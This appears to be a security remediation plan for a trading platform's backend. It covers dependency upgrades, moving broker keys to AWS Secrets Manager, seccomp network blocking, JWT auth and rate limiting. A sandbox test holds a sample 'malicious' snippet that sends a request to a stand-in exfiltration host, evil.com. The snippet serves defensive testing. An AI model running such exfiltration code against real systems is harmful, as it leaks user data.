# Security Remediation Plan - Task 49
## Immediate Action Items for Production Deployment

**Priority:** CRITICAL  
**Timeline:** Complete before production deployment  
**Owner:** Backend Engineering Team

---

## Phase 1: Critical Fixes (Week 1) - DO NOT DEPLOY WITHOUT THESE

### 1. Upgrade Vulnerable Dependencies (2 hours)

**File:** `signalixai-backend/requirements.txt`

```bash
# Update these packages immediately
pip install --upgrade aiohttp==3.9.2      # CVE-2024-23334 (HTTP smuggling)
pip install --upgrade langchain==0.1.10   # CVE-2024-27444 (code execution)
pip install --upgrade sqlalchemy==2.0.30  # CVE-2024-5629 (SQL injection)
pip install --upgrade fastapi==0.109.1    # CVE-2024-24762 (path traversal)

# Test after upgrade
pytest tests/ -v
```

**Verification:**
```bash
pip list | grep -E "aiohttp|langchain|sqlalchemy|fastapi"
```

---

### 2. Implement AWS Secrets Manager Integration (8 hours)

#### Step 1: Install AWS SDK
```bash
pip install boto3==1.34.34 botocore==1.34.34
```

#### Step 2: Create Secrets Manager Client

**File:** `signalixai-backend/shared/utils/secrets_manager.py`

```python
import boto3
from botocore.exceptions import ClientError
import json
from typing import Optional, Dict, Any
import logging

logger = logging.getLogger(__name__)

class SecretsManager:
    """AWS Secrets Manager client for broker API credentials"""
    
    def __init__(self, region_name: str = None):
        self.region_name = region_name or os.getenv("AWS_REGION", "us-east-1")
        self.client = boto3.client(
            service_name='secretsmanager',
            region_name=self.region_name
        )
    
    def get_broker_credentials(
        self, 
        user_id: str, 
        broker: str
    ) -> Optional[Dict[str, Any]]:
        """
        Retrieve broker API credentials from AWS Secrets Manager
        
        Secret name format: signalix/broker/{user_id}/{broker}
        
        Returns:
            Dict with api_key, api_secret, and other broker-specific fields
        """
        secret_name = f"signalix/broker/{user_id}/{broker}"
        
        try:
            response = self.client.get_secret_value(SecretId=secret_name)
            credentials = json.loads(response['SecretString'])
            
            logger.info(
                f"Retrieved credentials for user {user_id}, broker {broker}",
                extra={"user_id": user_id, "broker": broker}
            )
            
            return credentials
            
        except ClientError as e:
            error_code = e.response['Error']['Code']
            
            if error_code == 'ResourceNotFoundException':
                logger.warning(
                    f"No credentials found for user {user_id}, broker {broker}"
                )
                return None
            elif error_code == 'AccessDeniedException':
                logger.error(
                    f"Access denied to secret for user {user_id}, broker {broker}"
                )
                raise
            else:
                logger.error(f"Error retrieving secret: {e}")
                raise
    
    def store_broker_credentials(
        self, 
        user_id: str, 
        broker: str, 
        credentials: Dict[str, Any]
    ) -> bool:
        """
        Store broker API credentials in AWS Secrets Manager
        
        Args:
            user_id: User UUID
            broker: Broker name (e.g., 'angelone', 'binance')
            credentials: Dict with api_key, api_secret, etc.
        
        Returns:
            True if successful
        """
        secret_name = f"signalix/broker/{user_id}/{broker}"
        
        try:
            # Try to create new secret
            self.client.create_secret(
                Name=secret_name,
                SecretString=json.dumps(credentials),
                Tags=[
                    {'Key': 'user_id', 'Value': user_id},
                    {'Key': 'broker', 'Value': broker},
                    {'Key': 'service', 'Value': 'signalix-execution'},
                    {'Key': 'environment', 'Value': os.getenv('ENVIRONMENT', 'production')}
                ]
            )
            
            logger.info(
                f"Created new secret for user {user_id}, broker {broker}",
                extra={"user_id": user_id, "broker": broker}
            )
            
            return True
            
        except ClientError as e:
            if e.response['Error']['Code'] == 'ResourceExistsException':
                # Update existing secret
                self.client.update_secret(
                    SecretId=secret_name,
                    SecretString=json.dumps(credentials)
                )
                
                logger.info(
                    f"Updated existing secret for user {user_id}, broker {broker}",
                    extra={"user_id": user_id, "broker": broker}
                )
                
                return True
            else:
                logger.error(f"Error storing secret: {e}")
                raise
    
    def delete_broker_credentials(
        self, 
        user_id: str, 
        broker: str,
        recovery_window_days: int = 30
    ) -> bool:
        """
        Delete broker API credentials from AWS Secrets Manager
        
        Args:
            user_id: User UUID
            broker: Broker name
            recovery_window_days: Days before permanent deletion (7-30)
        
        Returns:
            True if successful
        """
        secret_name = f"signalix/broker/{user_id}/{broker}"
        
        try:
            self.client.delete_secret(
                SecretId=secret_name,
                RecoveryWindowInDays=recovery_window_days
            )
            
            logger.info(
                f"Scheduled deletion of secret for user {user_id}, broker {broker}",
                extra={
                    "user_id": user_id, 
                    "broker": broker,
                    "recovery_window_days": recovery_window_days
                }
            )
            
            return True
            
        except ClientError as e:
            logger.error(f"Error deleting secret: {e}")
            raise


# Singleton instance
_secrets_manager = None

def get_secrets_manager() -> SecretsManager:
    """Get or create SecretsManager singleton"""
    global _secrets_manager
    if _secrets_manager is None:
        _secrets_manager = SecretsManager()
    return _secrets_manager
```

#### Step 3: Update Broker Adapters

**File:** `signalixai-backend/services/execution/adapters/openalgo_adapter.py`

```python
from shared.utils.secrets_manager import get_secrets_manager

class OpenAlgoAdapter(BrokerAdapter):
    def __init__(
        self, 
        user_id: str, 
        broker: str, 
        paper_trading: bool = False
    ):
        """
        Initialize OpenAlgo adapter with credentials from Secrets Manager
        
        Args:
            user_id: User UUID
            broker: Broker name (e.g., 'angelone', 'zerodha')
            paper_trading: Use paper trading mode
        """
        self.user_id = user_id
        self.broker = broker
        
        # Fetch credentials from AWS Secrets Manager
        secrets_manager = get_secrets_manager()
        credentials = secrets_manager.get_broker_credentials(user_id, broker)
        
        if not credentials:
            raise ValueError(
                f"No credentials found for user {user_id}, broker {broker}. "
                "Please configure broker connection first."
            )
        
        # Build config from secrets
        config = {
            "base_url": credentials.get("base_url"),
            "api_key": credentials.get("api_key"),
            "broker": broker,
            "client_id": credentials.get("client_id")  # Optional
        }
        
        # Initialize parent
        super().__init__(config, paper_trading)
        
        # Clear sensitive data from memory immediately
        del credentials
        
        logger.info(
            f"Initialized OpenAlgo adapter for user {user_id}, broker {broker}",
            extra={"user_id": user_id, "broker": broker, "paper_trading": paper_trading}
        )
```

#### Step 4: Environment Configuration

**File:** `signalixai-backend/.env`

```bash
# AWS Secrets Manager Configuration
AWS_REGION=us-east-1
AWS_ACCESS_KEY_ID=<your-access-key>
AWS_SECRET_ACCESS_KEY=<your-secret-key>

# OR use IAM role (recommended for EC2/ECS)
# No credentials needed if using IAM role
```

#### Step 5: Migration Script

**File:** `signalixai-backend/scripts/migrate_api_keys_to_secrets_manager.py`

```python
"""
Migrate existing API keys from database to AWS Secrets Manager
"""
import asyncio
from sqlalchemy import select
from shared.database.models import BrokerConnection
from shared.utils.secrets_manager import get_secrets_manager
from shared.database.session import get_db

async def migrate_api_keys():
    """Migrate all API keys to Secrets Manager"""
    secrets_manager = get_secrets_manager()
    
    async with get_db() as session:
        # Fetch all broker connections with API keys
        result = await session.execute(
            select(BrokerConnection).where(
                BrokerConnection.api_key.isnot(None)
            )
        )
        connections = result.scalars().all()
        
        print(f"Found {len(connections)} broker connections to migrate")
        
        for conn in connections:
            try:
                # Store in Secrets Manager
                credentials = {
                    "api_key": conn.api_key,
                    "api_secret": conn.api_secret,
                    "base_url": conn.base_url,
                    "client_id": conn.client_id
                }
                
                success = secrets_manager.store_broker_credentials(
                    user_id=str(conn.user_id),
                    broker=conn.broker,
                    credentials=credentials
                )
                
                if success:
                    # Clear from database
                    conn.api_key = None
                    conn.api_secret = None
                    conn.secrets_manager_arn = f"signalix/broker/{conn.user_id}/{conn.broker}"
                    
                    print(f"✅ Migrated {conn.broker} for user {conn.user_id}")
                else:
                    print(f"❌ Failed to migrate {conn.broker} for user {conn.user_id}")
                    
            except Exception as e:
                print(f"❌ Error migrating {conn.broker} for user {conn.user_id}: {e}")
        
        await session.commit()
        print(f"\n✅ Migration complete!")

if __name__ == "__main__":
    asyncio.run(migrate_api_keys())
```

**Run migration:**
```bash
python scripts/migrate_api_keys_to_secrets_manager.py
```

---

### 3. Enhance Sandbox Network Blocking (4 hours)

**File:** `signalixai-backend/services/algo_builder/sandbox.py`

**Add to line 200 (inside seccomp setup):**

```python
# Block network syscalls explicitly
blocked_syscalls = [
    'socket', 'connect', 'sendto', 'recvfrom', 
    'bind', 'listen', 'accept', 'socketpair',
    'sendmsg', 'recvmsg', 'shutdown', 'getsockname',
    'getpeername', 'socketcall'
]

for syscall in blocked_syscalls:
    try:
        syscall_nr = libseccomp.seccomp_syscall_resolve_name(
            syscall.encode('utf-8')
        )
        if syscall_nr >= 0:
            # SCMP_ACT_KILL will terminate the process
            libseccomp.seccomp_rule_add(
                ctx, SCMP_ACT_KILL, syscall_nr, 0
            )
            print(f"Blocked syscall: {syscall}", file=sys.stderr)
    except Exception as e:
        print(f"Warning: Could not block {syscall}: {e}", file=sys.stderr)
```

**Test network blocking:**

```python
# tests/test_sandbox_network_blocking.py
def test_sandbox_blocks_network_access():
    """Verify sandbox blocks network requests"""
    
    malicious_code = '''
import requests
try:
    response = requests.get('https://evil.com/exfiltrate')
    network_access_succeeded = True
    network_error = None
except Exception as e:
    network_access_succeeded = False
    network_error = str(e)
'''
    
    runner = SandboxRunner()
    test_data = runner._create_test_data(100)
    
    # Should raise RuntimeError due to blocked network access
    with pytest.raises(RuntimeError, match="network|socket|connection"):
        runner.execute(malicious_code, test_data, 100000.0)
```

---

### 4. Implement JWT Authentication (4 hours)

**File:** `signalixai-backend/shared/auth/jwt_auth.py`

```python
from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from jose import JWTError, jwt
from datetime import datetime, timedelta
from typing import Optional
import os

# JWT Configuration
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY")
JWT_ALGORITHM = "HS256"
JWT_EXPIRATION_MINUTES = 60

if not JWT_SECRET_KEY:
    raise ValueError("JWT_SECRET_KEY environment variable not set")

security = HTTPBearer()

def create_access_token(user_id: str, expires_delta: Optional[timedelta] = None) -> str:
    """Create JWT access token"""
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=JWT_EXPIRATION_MINUTES)
    
    to_encode = {
        "sub": user_id,
        "exp": expire,
        "iat": datetime.utcnow()
    }
    
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)
    return encoded_jwt

async def get_current_user_id(
    credentials: HTTPAuthorizationCredentials = Depends(security)
) -> str:
    """
    Extract and validate user ID from JWT token
    
    Raises:
        HTTPException: If token is invalid or expired
    """
    try:
        token = credentials.credentials
        payload = jwt.decode(
            token, 
            JWT_SECRET_KEY, 
            algorithms=[JWT_ALGORITHM]
        )
        
        user_id: str = payload.get("sub")
        if user_id is None:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid authentication credentials",
                headers={"WWW-Authenticate": "Bearer"},
            )
        
        return user_id
        
    except JWTError as e:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=f"Could not validate credentials: {str(e)}",
            headers={"WWW-Authenticate": "Bearer"},
        )
```

**Update all routers to use real JWT auth:**

```python
# Replace placeholder function with:
from shared.auth.jwt_auth import get_current_user_id
```

---

## Phase 2: High Priority Fixes (Week 2)

### 5. Add Rate Limiting (2 hours)

**File:** `signalixai-backend/shared/middleware/rate_limit.py`

```python
from slowapi import Limiter
from slowapi.util import get_remote_address
from fastapi import Request

limiter = Limiter(key_func=get_remote_address)

# Apply to resource-intensive endpoints
@router.post("/strategies/{strategy_id}/compile")
@limiter.limit("10/hour")
async def compile_strategy(...):
    ...

@router.post("/backtest/run")
@limiter.limit("20/hour")
async def run_backtest(...):
    ...
```

### 6. Implement Security Logging (2 hours)

**File:** `signalixai-backend/shared/logging/security_logger.py`

```python
import logging
from datetime import datetime
from typing import Optional

security_logger = logging.getLogger("security")

def log_security_event(
    event_type: str,
    user_id: str,
    resource_type: str,
    resource_id: str,
    action: str,
    result: str,
    ip_address: Optional[str] = None,
    user_agent: Optional[str] = None,
    additional_context: Optional[dict] = None
):
    """Log security-relevant events"""
    security_logger.info(
        f"Security Event: {event_type}",
        extra={
            "event_type": event_type,
            "user_id": user_id,
            "resource_type": resource_type,
            "resource_id": resource_id,
            "action": action,
            "result": result,
            "ip_address": ip_address,
            "user_agent": user_agent,
            "timestamp": datetime.utcnow().isoformat(),
            "additional_context": additional_context or {}
        }
    )
```

---

## Verification Checklist

Before deploying to production:

- [ ] All vulnerable dependencies upgraded
- [ ] AWS Secrets Manager integration tested
- [ ] API keys migrated from database
- [ ] Sandbox network blocking verified
- [ ] JWT authentication implemented
- [ ] Rate limiting configured
- [ ] Security logging enabled
- [ ] All tests passing
- [ ] Security team sign-off

---

## Testing Commands

```bash
# Run all tests
pytest tests/ -v --cov=services

# Test specific security features
pytest tests/test_sandbox_network_blocking.py -v
pytest tests/test_jwt_authentication.py -v
pytest tests/test_secrets_manager.py -v

# Check for vulnerable dependencies
pip-audit

# Verify AWS Secrets Manager access
python scripts/test_secrets_manager_connection.py
```

---

## Rollback Plan

If issues arise after deployment:

1. **Secrets Manager Issues:**
   ```bash
   # Revert to database credentials temporarily
   export USE_SECRETS_MANAGER=false
   ```

2. **Authentication Issues:**
   ```bash
   # Enable debug mode
   export JWT_DEBUG=true
   ```

3. **Sandbox Issues:**
   ```bash
   # Disable seccomp temporarily (NOT for production)
   export DISABLE_SECCOMP=true
   ```

---

**Estimated Total Time:** 20-24 hours  
**Required Skills:** Python, AWS, Security  
**Dependencies:** AWS account with Secrets Manager access

